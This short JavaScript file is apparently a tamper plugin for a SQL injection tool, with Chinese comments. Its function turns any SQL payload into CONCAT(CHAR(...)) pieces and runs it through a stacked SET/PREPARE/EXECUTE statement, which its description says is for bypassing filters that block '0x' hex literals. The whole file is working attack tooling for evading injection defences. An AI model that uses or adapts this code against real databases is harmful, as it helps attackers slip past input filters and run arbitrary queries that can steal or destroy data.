//@name: Hex预编译char变体
//@usage: payload
//@enable: false
//@description: hexprepare的char()变体（0x被过滤时改用CONCAT(CHAR(..),..)拼接，堆叠通道专用）
function utf8bin(s){ return unescape(encodeURIComponent(s)); }
function tamper(payload){
    var bin = utf8bin(payload);
    var parts = [];
    for (var i = 0; i < bin.length; i++){
        parts.push('CHAR(' + bin.charCodeAt(i) + ')');
    }
    return ';SET @s=CONCAT(' + parts.join(',') + ');PREPARE stmt FROM @s;EXECUTE stmt;';
}